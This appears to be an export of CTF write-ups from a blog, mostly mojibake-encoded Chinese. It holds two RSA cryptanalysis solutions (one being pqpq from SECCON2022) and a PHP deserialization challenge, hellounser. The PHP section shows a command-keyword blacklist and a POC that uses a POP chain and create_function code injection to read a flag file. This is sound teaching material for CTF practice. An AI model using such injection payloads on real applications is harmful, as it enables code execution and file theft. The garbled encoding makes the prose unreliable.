= 0    unpack = struct.unpack    # Up to Python 2.7.4, struct.unpack can't work with bytearrays nor    # memoryviews    if sys.version_info[0:3] &lt; (2, 7, 4):        if isinstance(s, bytearray):            s = bytes(s)        elif isinstance(s, memoryview):            s = s.tobytes()    length = len(s)    if length % 4:        extra = (4 - length % 4)        s = b'\\x00' * extra + s        length = length + extra    for i in range(0, length, 4):        acc = (acc &lt;&lt; 32) + unpack('&gt;I', s[i:i+4])[0]    return acc\næ•´ä¸ªå‡½æ•°å°±æ˜¯æŠŠå‚æ•°çš„æ¯ä¸€ä¸ªå­—èŠ‚è½¬æˆ16è¿›åˆ¶ç„¶åæ‹¼èµ·æ¥ï¼Œæ˜¾ç„¶ï¼Œpè¶Šå¤§ï¼Œppä¹Ÿè¶Šå¤§ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥å¯¹è¿›è¡ŒäºŒåˆ†è§„çº¦\n#Phrase 1def l2b2l(p):    trans=str(p).encode()    return(bytes_to_long(trans))def break1(n):    l=0    r=2**512    v=0    while(l&lt;=r):        m=(l+r)//2        v=m*l2b2l(m)        if(v&lt;n):            l=m        elif(v&gt;n):            r=m        else:            return m,n//m\nPhase 2å¯¹å’Œè¿›è¡Œåˆ†æï¼š\n\n\\begin{align}\nn_2&=p_2*p_3\\\\\n&=(a_{01}+a_{11}*10+a_{21}*{10}^2+...)*(a_{02}+a_{12}*10+a_{22}*{10}^2+...)\\\\\nn_3&=q_2*q_3\\\\\n&=[(a_{01}+48)+(a_{11}+48)*256+...]*[(a_{02}+48)+(a_{12}+48)*256+...]\\\\\nTherefore,\\\\\nn_2&=a_{01}*a_{02}&(mod\\ 10)\\\\\nn_2&=(a_{01}+a_{11}*10)*(a_{02}+a_{12}*10)&(mod\\ {10}^2)\\\\\n&...\\\\\nn_2&=(a_{01}+...+a_{n1}*{10}^n)*(a_{02}+...+a_{n2}*{10}^{n})&(mod\\ {10}^{n+1})\\\\\n\\\\\nn_3&=(a_{01}+48)*(a_{02}+48)&(mod\\ 256)\\\\\n...\\\\\nn_3&=[(a_{01}+48)+...+(a_{n1}+48)*{256}^n]*[(a_{02}+48)+...+(a_{n2}+48)*{256}^n]&(mod\\ {256}^{n+1})\n\\end{align}æ‰€ä»¥å¯ä»¥å¯¹æ¯ä¸€ä½è¿›è¡Œçˆ†ç ´\n#Phase 2#Prune and Search#official writeup from maple3142def break2(n1, n2):    n1p = None    def test_digits(ps, qs):        nonlocal n1p        if n1p is not None:            return False        p = sum([pi * 10**i for i, pi in enumerate(ps)])        pp = sum([(48 + pi) * 256**i for i, pi in enumerate(ps)])        q = sum([pi * 10**i for i, pi in enumerate(qs)])        qq = sum([(48 + pi) * 256**i for i, pi in enumerate(qs)])        if p != 0 and p != 1 and n1 % p == 0:            n1p = p            return False        m1 = 10 ** len(ps)        m2 = 256 ** len(qs)        return (p * q) % m1 == n1 % m1 and (pp * qq) % m2 == n2 % m2    def find_ij(ps, qs):        for i in range(10):            for j in range(10):                if test_digits(ps + [i], qs + [j]):                    yield i, j    def search(ps, qs):        for i, j in find_ij(ps, qs):            search(ps + [i], qs + [j])    search([], [])    n2p = bytes_to_long(str(n1p).encode())    assert n2 % n2p == 0    return (n1p, n1 // n1p), (n2p, n2 // n2p)\nPhase 3ç¬¬ä¸‰éƒ¨åˆ†å¾ˆç®€å•ï¼Œå¯ä»¥ç›´æ¥å‚ç…§ç¬¬ä¸€éƒ¨åˆ†ï¼Œåªæ˜¯è¿™é‡Œæœ‰ä¸€äº›å°å˜åŒ–ï¼Œ$n_4=p_4l2b2l(p_5)=p_4l2b2l(\\frac{n_5}{l2b2l(p_4)})$ï¼Œä»ç„¶è¿›è¡ŒäºŒåˆ†è§„çº¦\n#Phase3def break3(n1, n2):    def try_factor(l, r):        while l &lt; r:            m = (l + r) // 2            if m &gt; 1 and n1 % m == 0:                return m            if m * l2b2l(n2 // l2b2l(m)) &lt; n1:                l = m + 1            else:                r = m - 1    for i in range(16):        # brute force top 4 bits of p1        # because len(str(p1)) must be constant to have monotonic property        l = i &lt;&lt; 508        r = l + (1 &lt;&lt; 508)        if p1 := try_factor(l, r):            return (p1, n1 // p1), (l2b2l(p1), n2 // l2b2l(p1))\næ‰€æœ‰çš„på’Œqéƒ½çŸ¥é“äº†ï¼Œç›´æ¥è¿›è¡ŒRSAè§£å¯†å³å¯å¾—åˆ°flag\nEXPfrom Crypto.Util.number import *from gmpy2 import *#Phase 1def l2b2l(p):    trans=str(p).encode()    return(bytes_to_long(trans))def break1(n):    l=0    r=2**512    v=0    while(l&lt;=r):        m=(l+r)//2        v=m*l2b2l(m)        if(v&lt;n):            l=m        elif(v&gt;n):            r=m        else:            return m,n//m#Phase 2#Prune and Search#official writeup from maple3142def break2(n1, n2):    n1p = None    def test_digits(ps, qs):        nonlocal n1p        if n1p is not None:            return False        p = sum([pi * 10**i for i, pi in enumerate(ps)])        pp = sum([(48 + pi) * 256**i for i, pi in enumerate(ps)])        q = sum([pi * 10**i for i, pi in enumerate(qs)])        qq = sum([(48 + pi) * 256**i for i, pi in enumerate(qs)])        if p != 0 and p != 1 and n1 % p == 0:            n1p = p            return False        m1 = 10 ** len(ps)        m2 = 256 ** len(qs)        return (p * q) % m1 == n1 % m1 and (pp * qq) % m2 == n2 % m2    def find_ij(ps, qs):        for i in range(10):            for j in range(10):                if test_digits(ps + [i], qs + [j]):                    yield i, j    def search(ps, qs):        for i, j in find_ij(ps, qs):            search(ps + [i], qs + [j])    search([], [])    n2p = bytes_to_long(str(n1p).encode())    assert n2 % n2p == 0    return (n1p, n1 // n1p), (n2p, n2 // n2p)#Phase3def break3(n1, n2):    def try_factor(l, r):        while l &lt; r:            m = (l + r) // 2            if m &gt; 1 and n1 % m == 0:                return m            if m * l2b2l(n2 // l2b2l(m)) &lt; n1:                l = m + 1            else:                r = m - 1    for i in range(16):        # brute force top 4 bits of p1        # because len(str(p1)) must be constant to have monotonic property        l = i &lt;&lt; 508        r = l + (1 &lt;&lt; 508)        if p1 := try_factor(l, r):            return (p1, n1 // p1), (l2b2l(p1), n2 // l2b2l(p1))#breakwith open(\"output.txt\") as f:    exec(f.read())p1,q1=break1(n1)(p2,p3),(q2,q3)=break2(n2,n3)(p4,q5),(p5,q4)=break3(n4,n5)phi1=(p1-1)*(q1-1)phi2=(p2-1)*(p3-1)phi3=(q2-1)*(q3-1)phi4=(p4-1)*(q5-1)phi5=(p5-1)*(q4-1)d1=invert(e,phi1)d2=invert(e,phi2)d3=invert(e,phi3)d4=invert(e,phi4)d5=invert(e,phi5)c=pow(c,d3,n3)c=pow(c,d4,n4)c=pow(c,d5,n5)c=pow(c,d1,n1)c=pow(c,d2,n2)print(long_to_bytes(c))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"PHPååºåˆ—åŒ–-hellounser","url":"/2023/03/22/hellounser/","content":"hellounser [DASCTF 2021 Sept]Analyzeå…ˆä¸Šé¢˜\n&lt;?phpclass A {    public $var;    public function show(){        echo $this-&gt;var;    }    public function __invoke(){        $this-&gt;show();    }}class B{    public $func;    public $arg;        public function show(){        $func = $this-&gt;func;        if(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this-&gt;arg)) {             die('No!No!No!');         } else {             include \"flag.php\";            //There is no code to print flag in flag.php            $func('', $this-&gt;arg);         }    }        public function __toString(){        $this-&gt;show();        return \"&lt;br&gt;\".\"Nice Job!!\".\"&lt;br&gt;\";    }        }if(isset($_GET['pop'])){    $aaa = unserialize($_GET['pop']);    $aaa();}else{    highlight_file(__FILE__);}?&gt;\nç¨åŠ åˆ†æï¼Œåœ¨ç±»Bä¸­ï¼Œå‡½æ•°show()åŒ…å«äº†flag.phpï¼Œè€Œå‡½æ•°__toString()è°ƒç”¨äº†å‡½æ•°show()ï¼Œ\n\n__toString()ï¼šç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•\n\nè€Œåœ¨ç±»Aä¸­ï¼Œå‡½æ•°show()ä¼šè¾“å‡ºå­—ç¬¦ä¸²varï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†varå®šä¹‰ä¸ºBçš„å¯¹è±¡ï¼Œè€Œç±»Aä¸­çš„å‡½æ•°show()åˆè¢«å‡½æ•°__invoke()è°ƒç”¨\n\n__invoke()ï¼šè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•\n\nPOPé“¾æ¸…æ™°äº†ï¼Œé‚£ä¹ˆç°åœ¨å°±çœ‹çœ‹å¦‚ä½•è·å–flagï¼Œå¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬æ—¢ä¸èƒ½æ»¡è¶³preg_match('/^[a-z0-9]*$/isD', $this-&gt;func)ï¼Œåˆä¸èƒ½æ»¡è¶³preg_match('...', $this-&gt;arg)ï¼Œå‰ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼é™åˆ¶äº†funcä¸èƒ½ä¸ºçº¯å­—æ¯æˆ–æ•°å­—ï¼Œiä¸ºä¸åŒºåˆ†å¤§å°å†™ï¼Œsä¸ºåŒ¹é…ä»»ä½•ä¸å¯è§å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦â€¦ï¼Œç­‰ä»·äº[fnrtv]ï¼ŒDä¸ºå¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œï¼Œè€Œåä¸€ä¸ªåˆ™æ˜¯æ™®é€šçš„å­—ç¬¦è¿‡æ»¤ã€‚\nåœ¨è¿™é‡Œå¯ä»¥è€ƒè™‘ä½¿ç”¨å‡½æ•°create_function()\n\nfcreate_function()ï¼šä¼šåˆ›é€ ä¸€ä¸ªåŒ¿åå‡½æ•° ï¼ˆlambdaæ ·å¼ï¼‰ï¼Œä¸”ä¼šåœ¨å†…éƒ¨è°ƒç”¨å‡½æ•°eval()\n\nè¿›è¡Œä»£ç æ³¨å…¥ï¼šreturn(1);}???;//\néšåè¿›è¡Œç®€å•çš„ç»•è¿‡å³å¯\nPOC&lt;?phpclass A {    public $var;    public function show()    {        echo $this-&gt;var;    }    public function __invoke()    {        $this-&gt;show();    }}class B{    public $func;    public $srg;    public function __toString()    {        $this-&gt;show();    }}$a=new A();$b=new B();$ac=(~('php://filter/read=convert.base64-encode/resource=Tru3flag.php'));$b-&gt;func=\"create_function\";$b-&gt;arg='return(1);}require(~('.strval($ac).'));//';$a-&gt;var=$b;echo urlencode(serialize($a));\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"pqpq [SECCON2022]","url":"/2023/03/22/pqpq/","content":"pqpq [SECCON2022]Analyzeå…ˆä¸Šé¢˜\nfrom Crypto.Util.number import *from Crypto.Random import *from flag import flagp = getPrime(512)q = getPrime(512)r = getPrime(512)n = p * q * re = 2 * 65537assert n.bit_length() // 8 - len(flag) &gt; 0padding = get_random_bytes(n.bit_length() // 8 - len(flag))m = bytes_to_long(padding + flag)assert m &lt; nc1p = pow(p, e, n)c1q = pow(q, e, n)cm = pow(m, e, n)c1 = (c1p - c1q) % nc2 = pow(p - q, e, n)print(f\"e = {e}\")print(f\"n = {n}\")# p^e - q^e mod nprint(f\"c1 = {c1}\")# (p-q)^e mod nprint(f\"c2 = {c2}\")# m^e mod nprint(f\"cm = {cm}\")# e = 131074# n = 587926815910957928506680558951380405698765957736660571041732511939308424899531125274073420353104933723578377320050609109973567093301465914201779673281463229043539776071848986139657349676692718889679333084650490543298408820393827884588301690661795023628407437321580294262453190086595632660415087049509707898690300735866307908684649384093580089579066927072306239235691848372795522705863097316041992762430583002647242874432616919707048872023450089003861892443175057# c1 = 92883677608593259107779614675340187389627152895287502713709168556367680044547229499881430201334665342299031232736527233576918819872441595012586353493994687554993850861284698771856524058389658082754805340430113793873484033099148690745409478343585721548477862484321261504696340989152768048722100452380071775092776100545951118812510485258151625980480449364841902275382168289834835592610827304151460005023283820809211181376463308232832041617730995269229706500778999# c2 = 46236476834113109832988500718245623668321130659753618396968458085371710919173095425312826538494027621684566936459628333712619089451210986870323342712049966508077935506288610960911880157875515961210931283604254773154117519276154872411593688579702575956948337592659599321668773003355325067112181265438366718228446448254354388848428310614023369655106639341893255469632846938342940907002778575355566044700049191772800859575284398246115317686284789740336401764665472# cm = 357982930129036534232652210898740711702843117900101310390536835935714799577440705618646343456679847613022604725158389766496649223820165598357113877892553200702943562674928769780834623569501835458020870291541041964954580145140283927441757571859062193670500697241155641475887438532923910772758985332976303801843564388289302751743334888885607686066607804176327367188812325636165858751339661015759861175537925741744142766298156196248822715533235458083173713289585866\nç›®å‰æˆ‘ä»¬åªçŸ¥é“ï¼Œï¼Œç¨åŠ åˆ†æï¼š\n\n\\begin{align}\nc_1&=p^e-q^e&(mod\\ n)\\\\\nc_2&=(p-q)^e\\\\\n&=p^e-p^{e-1}q+...-pq^{e-1}+q^e&(mod\\ n)\\\\\nc_1+c_2&=(p^e-q^e)+(p^e-p^{e-1}q+...-pq^{e-1}+q^e)\\\\\n&=(p^e+p^e-p^{e-1}+...-pq^{e-1})+(q^e-q^e)\\\\\n&=p(p^{e-1}+p^{e-1}-p^{e-2}q+...-q^{e-1})\\\\\n&=k_1p&(mod\\ n)\\\\\nc_1-c_2&=(p^e-q^e)-(p^e-p^{e-1}q+...-pq^{e-1}+q^e)\\\\\n&=(p^e-p^e)+(-q^e+p^{e-1}q-...+pq^{e-1}-q^e)\\\\\n&=q(-q^{e-1}+p^{e-1}-...+pq^{e-2}-q^{e-1})\\\\\n&=k_2q&(mod\\ n)\\\\\ngcd(c_1+c_2,n)&=gcd(k_1p,n)\\\\\n&=gcd(k_1p,pqr)\\\\\n&=p\\\\\ngcd(c_1-c_2,n)&=gcd(k_2q,n)\\\\\n&=gcd(k_2q,pqr)\\\\\n&=q\\\\\nr&=\\frac{n}{pq}\\\\\n\\end{align}åˆ°æ­¤æˆ‘ä»¬ä¾¿å¯è·å¾—pï¼Œqï¼Œr\nç”±äºï¼Œå¹¶ä¸ä¸äº’ç´ ï¼Œæ— æ³•ç›´æ¥è®¡ç®—é€†å…ƒdï¼Œä½†æˆ‘ä»¬çŸ¥é“pï¼Œqï¼Œrçš„å€¼ï¼Œæ‰€ä»¥ä¾¿å¯è®¡ç®—çš„8ä¸ªå¯èƒ½å€¼ï¼Œç­›é€‰åå³å¯å¾—åˆ°flag\nEXPfrom Crypto.Util.number import *from sympy.ntheory.modular import *from gmpy2 import *from itertools import *e = 131074n = 587926815910957928506680558951380405698765957736660571041732511939308424899531125274073420353104933723578377320050609109973567093301465914201779673281463229043539776071848986139657349676692718889679333084650490543298408820393827884588301690661795023628407437321580294262453190086595632660415087049509707898690300735866307908684649384093580089579066927072306239235691848372795522705863097316041992762430583002647242874432616919707048872023450089003861892443175057c1 = 92883677608593259107779614675340187389627152895287502713709168556367680044547229499881430201334665342299031232736527233576918819872441595012586353493994687554993850861284698771856524058389658082754805340430113793873484033099148690745409478343585721548477862484321261504696340989152768048722100452380071775092776100545951118812510485258151625980480449364841902275382168289834835592610827304151460005023283820809211181376463308232832041617730995269229706500778999c2 = 46236476834113109832988500718245623668321130659753618396968458085371710919173095425312826538494027621684566936459628333712619089451210986870323342712049966508077935506288610960911880157875515961210931283604254773154117519276154872411593688579702575956948337592659599321668773003355325067112181265438366718228446448254354388848428310614023369655106639341893255469632846938342940907002778575355566044700049191772800859575284398246115317686284789740336401764665472cm = 357982930129036534232652210898740711702843117900101310390536835935714799577440705618646343456679847613022604725158389766496649223820165598357113877892553200702943562674928769780834623569501835458020870291541041964954580145140283927441757571859062193670500697241155641475887438532923910772758985332976303801843564388289302751743334888885607686066607804176327367188812325636165858751339661015759861175537925741744142766298156196248822715533235458083173713289585866p=gcd(c1+c2,n)q=gcd(c1-c2,n)r=n//p//q#Tonelli-Shanksdef legendre(a, p):    return pow(a, (p - 1) // 2, p)def tonelli(n, p):    r = []    assert legendre(n, p) == 1, \"not a square (mod p)\"    q = p - 1    s = 0    while q % 2 == 0:        q //= 2        s += 1    if s == 1:        return pow(n, (p + 1) // 4, p)    for z in range(2, p):        if p - 1 == legendre(z, p):            break    c = pow(z, q, p)    r = pow(n, (q + 1) // 2, p)    t = pow(n, q, p)    m = s    t2 = 0    while (t - 1) % p != 0:        t2 = (t * t) % p        for i in range(1, m):            if (t2 - 1) % p == 0:                break            t2 = (t2 * t2) % p        b = pow(c, 1 &lt;&lt; (m - i - 1), p)        r = (r * b) % p        c = (b * b) % p        t = (t * c) % p        m = i    return rphi=(p-1)*(q-1)*(r-1)dp=invert(e//2,p-1)dq=invert(e//2,q-1)dr=invert(e//2,r-1)mp2=pow(cm,dp,p)mq2=pow(cm,dq,q)mr2=pow(cm,dr,r)mp=tonelli(mp2,p)mq=tonelli(mq2,q)mr=tonelli(mr2,r)print(mp)print(mq)print(mr)'''for _mp, _mq, _mr in product([mp, p - mp], [mq, q - mq], [mr, r - mr]):    m = [p, q, r]    v = [_mp, _mq, _mr]    print(long_to_bytes(crt(m, v)[0]))'''for mp1,mq1,mr1 in product([mp,p-mp],[mq,q-mq],[mr,r-mr]):    x=[mp1,mq1,mr1]    y=[p,q,r]    print(long_to_bytes(crt(y,x)[0]))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]}]